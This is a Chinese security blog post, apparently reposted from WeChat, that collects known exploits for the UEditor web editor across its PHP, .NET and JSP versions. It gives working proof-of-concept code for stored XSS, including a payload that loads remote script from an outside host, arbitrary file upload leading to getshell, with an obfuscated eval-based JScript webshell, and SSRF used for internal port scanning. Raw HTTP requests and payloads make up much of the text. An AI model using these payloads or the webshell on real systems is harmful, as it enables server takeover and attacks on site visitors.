> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/mH4GWTVoCel4KHva-I4Elw)<table><tbody><tr><td width="557" valign="top" height="62"><section><strong>声明：</strong>该公众号大部分文章来自作者日常学习笔记，也有少部分文章是经过原作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。</section><section>请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。</section></td></tr></tbody></table>

**0x01 前言**

这篇文章是在某知识星球里看到的，感觉这位师傅总结的挺好，将网上已公开的 Ueditor 编辑器漏洞都整合在一起了，所以想着通过公众号让更多有需要的人看到，如作者看到这文章认为有不妥，还请联系删除，谢谢！

**0x02 XML 文件上传导致存储型 XSS**

测试版本：php 版 v1.4.3.3

下载地址：https://github.com/fex-team/ueditor

**复现步骤：**

1. 上传一个图片文件

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdArTQpjtMd0NiaDfRGyibXbkibdPXBqGloclnwcDdmYVMZibR0m9Ku0piaZUGmric7twopoFTbwt8Dlphw/640?wx_fmt=png)

2. 然后 buprsuit 抓包拦截

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdArTQpjtMd0NiaDfRGyibXbkgQicfg1BALLCk5aeqVJPCicqyGpxnajkO46nJzp7dZYbfQuLs3uvqGsA/640?wx_fmt=png)

3. 将 uploadimage 类型改为 uploadfile，并修改文件后缀名为 xml, 最后复制上 xml 代码即可

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdArTQpjtMd0NiaDfRGyibXbkoY7RThYQk2g4nZ9m661CrWB3gcd0bAb9jecdfOlxwACicCuAwGLV2mA/640?wx_fmt=png)

4. 即可弹出 xss

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdArTQpjtMd0NiaDfRGyibXbkHK15QtgrvjnAKEshibKAebh78qXgLQ5iaicamnd2pGTr0yCAlJHDicfPmw/640?wx_fmt=png)

‍  

请注意 controller.xxx 的访问路径

```
http://192.168.10.1/ueditor1433/php/controller.php?action=listfile
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdArTQpjtMd0NiaDfRGyibXbkDGwmeTnTchEjaXoPfbvInTTUR8ukuzHN4j1EicC8J3y0O8TdMbMicE7A/640?wx_fmt=png)

**常见的 xml 弹窗 POC：**

弹窗 xss：

```
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">
alert(1);
</something:script>
</body>
</html>
```

URL 跳转：

```
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">
window.location.href="https://www.t00ls.net/";
</something:script>
</body>
</html>
```

远程加载 Js：

```
<html>
<head></head>
<body>
<something:script src="http://xss.com/xss.js" xmlns:something="http://www.w3.org/1999/xhtml">
</something:script>
</body>
</html>
```

**常用的上传路径：**

```
/ueditor/index.html
/ueditor/asp/controller.asp?action=uploadimage
/ueditor/asp/controller.asp?action=uploadfile
/ueditor/net/controller.ashx?action=uploadimage
/ueditor/net/controller.ashx?action=uploadfile
/ueditor/php/controller.php?action=uploadfile
/ueditor/php/controller.php?action=uploadimage
/ueditor/jsp/controller.jsp?action=uploadfile
/ueditor/jsp/controller.jsp?action=uploadimage
```

**常用的上传路径：**

```
/ueditor/net/controller.ashx?action=listfile
/ueditor/net/controller.ashx?action=listimage
```

**0x03 文件上传漏洞**

**1. NET 版本文件上传**

该任意文件上传漏洞存在于 1.4.3.3、1.5.0 和 1.3.6 版本中，并且只有 **.NET** 版本受该漏洞影响。黑客可以利用该漏洞上传木马文件，执行命令控制服务器。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdArTQpjtMd0NiaDfRGyibXbkEFQqgib2ibO824R4Ial1oLBsOibSWRmqm5ianMe1jmaElcYpvoEBAxacWQ/640?wx_fmt=png)

ueditor 中已经下架. net 版本，但历史版本中可以下载 1.4.3 版本，但是否是 1.4.3.3 目前还没验证。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdArTQpjtMd0NiaDfRGyibXbkl4IibWWTpic4s4zb33WkI0XVgWRxjmnjfOH6A4rjsDzm7xkUKaQSLS2g/640?wx_fmt=png)

该漏洞是由于上传文件时，使用的 CrawlerHandler 类未对文件类型进行检验，导致了任意文件上传。1.4.3.3 和 1.5.0 版本利用方式稍有不同，1.4.3.3 需要一个能正确解析的域名。而 1.5.0 用 IP 和普通域名都可以。相对来说 1.5.0 版本更加容易触发此漏洞；而在 1.4.3.3 版本中攻击者需要提供一个正常的域名地址就可以绕过判断；

**(1) ueditor .1.5.0.net 版本**

首先 1.5.0 版本进行测试，需要先在外网服务器上传一个图片木马，比如: 1.jpg/1.gif/1.png 都可以，下面 x.x.x.x 是外网服务器地址，source[]参数值改为图片木马地址，并在结尾加上 “?.aspx” 即可 getshell，利用 POC：

```
POST /ueditor/net/controller.ashx?action=catchimage
source%5B%5D=http%3A%2F%2Fx.x.x.x/1.gif?.aspx
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdArTQpjtMd0NiaDfRGyibXbk4Y3IcSbIAophKib7xwQbyibdJ5fan1x0RZaHGGyh8kg6Q4KF0mC7FQeQ/640?wx_fmt=png)

**(2) ueditor.1.4.3.3 .net 版**

1. 本地构造一个 html，因为不是上传漏洞所以 enctype 不需要指定为 multipart/form-data， 之前见到有 poc 指定了这个值。完整的 poc 如下：

```
<form action="http://xxxxxxxxx/ueditor/net/controller.ashx?action=catchimage" enctype="application/x-www-form-urlencoded"  method="POST">
  <p>shell addr: <input type="text" name="source[]" /></p >
  <input type="submit" value="Submit" />
</form>
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdArTQpjtMd0NiaDfRGyibXbk4Va0PIl0ic5mRKMmKHzhgkXoW668ewM8xaoic5PNAoYekWptK0mLXpNg/640?wx_fmt=png)

2. 需准备一个图片马儿，远程 shell 地址需要指定扩展名为 1.gif?.aspx，1.gif 图片木马（一句话木马：密码：hello）如下：

```
GIF89a
<script runat="server" language="JScript">
   function popup(str) {
       var q = "u";
       var w = "afe";
       var a = q + "ns" + w; var b= eval(str,a); return(b);
  }
</script>
<% popup(popup(System.Text.Encoding.GetEncoding(65001). GetString(System.Convert.FromBase64String("UmVxdWVzdC5JdGVtWyJoZWxsbyJd")))); %>
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdArTQpjtMd0NiaDfRGyibXbkPWnypcjGwhEV30uLxhk1icicHibDRXWlU82mtn8y8OMKYZI4zvLpNvQFw/640?wx_fmt=png)

成功后，会返回马儿地址。

**(3) ueditor.1.3.6 .net1 版本**

使用 %00 截断的方式上传绕过

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdArTQpjtMd0NiaDfRGyibXbkibEK5Tka6t7eZfYh9ADbYp42A1Z9daiavTZiaeMm9DicibjRSUUYuWQW1iaA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdArTQpjtMd0NiaDfRGyibXbksRHq6MUe8I0GpUzVv5olQsI9AFlFH2pBdrTN65beoRFjRzG51HHFoQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdArTQpjtMd0NiaDfRGyibXbktib7nEGKLl01icgxmibKsbgCaFeiatm7stcfmibhaHDvAyN4ibhzskia33tdg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdArTQpjtMd0NiaDfRGyibXbkfPMUnRulguXJZKDiapNibUbswAsv4Y3zKkSNqW0ib3qic6j9UJ2Y3LXpSA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdArTQpjtMd0NiaDfRGyibXbkBBNrZssT6Fz7ojcZIjmzaiaA0u3qicdicGCwdOmcia0lhicOcUGvkVH7E4g/640?wx_fmt=png)

**0x04 PHP 版本的文件上传**

**利用 poc：**  

```
POST http://localhost/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=ueditor/php/upload/fuck&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]=fuck HTTP/1.1
Host: localhost
Connection: keep-alive
Content-Length: 222
Cache-Control: max-age=0
Origin: null
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/60.0.3112.78 Safari/537.36
Content-Type: multipart/form-data; boundary=——WebKitFormBoundaryDMmqvK6b3ncX4xxA
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
———WebKitFormBoundaryDMmqvK6b3ncX4xxA
Content-Disposition: form-data; 
Content-Type: application/octet-stream
<?php 
phpinfo();
?>
———WebKitFormBoundaryDMmqvK6b3ncX4xxA—

shell路径由CONFIG[imagePathFormat]=ueditor/php/upload/fuck决定
http://localhost/ueditor/php/upload/fuck.php
```

**0x05 SSRF 漏洞**

该漏洞存在于 1.4.3 的 jsp 版本中。但 1.4.3.1 版本已经修复了该漏洞。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdArTQpjtMd0NiaDfRGyibXbkgXg6rDzW26lX54O8niaxQeKpNPFYucliaYkhbxBicfwxWPcb91jACSicgw/640?wx_fmt=png)

已知该版本 ueditor 的 ssrf 触发点：

```
/jsp/controller.jsp?action=catchimage&source[]=
/jsp/getRemoteImage.jsp?upfile=
/php/controller.php?action=catchimage&source[]=
```

使用百度 logo 构造 poc：

```
http://1.1.1.1:8080/cmd/ueditor/jsp/controller.jsp?action=catchimage&source[]=https://www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png
```

Poc 如下，同样是该 controller 文件，构造 source 参数，即可进行内网相关端口探测。

```
/ueditor/jsp/getRemoteImage.jsp?upfile=http://127.0.0.1/favicon.ico?.jpg
/ueditor/jsp/controller.jsp?action=catchimage&source[]=https://www.baidu.com/img/baidu_jgylogo3.gif
/ueditor/php/controller.php?action=catchimage&source[]=https://www.baidu.com/img/baidu_jgylogo3.gif
```

这里可以根据页面返回的结果不同，来判断该地址对应的主机端口是否开放。可以总结为以下几点：

1. 如果抓取不存在的图片地址时，页面返回如下，即 state 为 “远程连接出错”。

```
{“state”: “SUCCESS”, list:[{“state”:"\u8fdc\u7a0b\u8fde\u63a5\u51fa\u9519"} ]}
```

2. 如果成功抓取到图片，页面返回如下，即 state 为 “SUCCESS”。

```
{“state”: “SUCCESS”, list: [{“state”:“SUCCESS”,“size”:“5103”,“source”:“http://192.168.135.133:8080/tomcat.png”,“title”:“1527173588127099881.png”,“url”:"/ueditor/jsp/upload/image/20180524/1527173588127099881.png"}]}
```

3. 如果主机无法访问，页面返回如下，即 state 为 “抓取远程图片失败”。

```
{“state”:“SUCCESS”, list: [{“state”:“\u6293\u53d6\u8fdc\u7a0b\u56fe\u7247\u5931\u8d25”}]}
```

还有一个版本的 ssrf 漏洞 ，存在于 onethink 1.0 中的 ueditor，测试版本为 1.2 直接贴 Poc：

```
POST http://target/Public/static/ueditor/php/getRemoteImage.php HTTP/1.1
Host: target
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101Firefox/55.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Connection: keep-alive

upfile=https://www.google.com/?%23.jpg
```

**0x06 另一处 XSS 漏洞**

首先安装部署环境：

```
https://github.com/fex-team/ueditor/releases/tag/v1.4.3.3
```

存储型 XSS 需要写入后端数据库，这里要把编辑器部署到一个可与数据库交互的环境中。首先我们打开编辑器输入正常的文本。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdArTQpjtMd0NiaDfRGyibXbkyR4AJS43DZsICkPgIARswuZKuVPzlhhIw0o2bhib7xzUHYwsQ5pbqfg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdArTQpjtMd0NiaDfRGyibXbkYD9uZSrBAbHr6ib2gCTC8sicpnOEHg9Tquh0QV42BIwkByzMmGzC5icibQ/640?wx_fmt=png)

抓包并将 <p> 标签以及原本的文本删除：

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdArTQpjtMd0NiaDfRGyibXbkZdSSLwJs33sfTb7H8eJQeZS7fia7pUvFUE5HVz8sHsVUvy5hzlHdjeA/640?wx_fmt=png)

插入 payload：

```
%3Cp%3E1111111"><ImG sRc=1 OnErRoR=prompt(1)>%3Cbr%2F%3E%3C%2Fp%3E
```

‍

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdArTQpjtMd0NiaDfRGyibXbkQubYjX6o3sBDR3m1iamBB008dqicXAgvGgOL8dBZohiaHMmzBCZtGEibIw/640?wx_fmt=png)

关注公众号回复 “9527” 可免费获取一套 HTB 靶场文档和视频，“1120” 安全参考等安全杂志 PDF 电子版，“1208” 个人常用高效爆破字典，“0221”2020 年酒仙桥文章打包，还在等什么？赶紧点击下方名片关注学习吧！

公众号

* * *

**推 荐 阅 读**

  

  

  

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcAcRDPBsTMEQ0pGhzmYrBp7pvhtHnb0sJiaBzhHIILwpLtxYnPjqKmibA/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247487086&idx=1&sn=37fa19dd8ddad930c0d60c84e63f7892&chksm=cfa6aa7df8d1236bb49410e03a1678d69d43014893a597a6690a9a97af6eb06c93e860aa6836&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcIJDWu9lMmvjKulJ1TxiavKVzyum8jfLVjSYI21rq57uueQafg0LSTCA/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486961&idx=1&sn=d02db4cfe2bdf3027415c76d17375f50&chksm=cfa6a9e2f8d120f4c9e4d8f1a7cd50a1121253cb28cc3222595e268bd869effcbb09658221ec&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf8eyzKWPF5pVok5vsp74xolhlyLt6UPab7jQddW6ywSs7ibSeMAiae8TXWjHyej0rmzO5iaZCYicSgxg/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486327&idx=1&sn=71fc57dc96c7e3b1806993ad0a12794a&chksm=cfa6af64f8d1267259efd56edab4ad3cd43331ec53d3e029311bae1da987b2319a3cb9c0970e&scene=21#wechat_redirect)

**欢 迎 私 下 骚 扰**

  

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/XOPdGZ2MYOdSMdwH23ehXbQrbUlOvt6Y0G8fqI9wh7f3J29AHLwmxjIicpxcjiaF2icmzsFu0QYcteUg93sgeWGpA/640?wx_fmt=jpeg)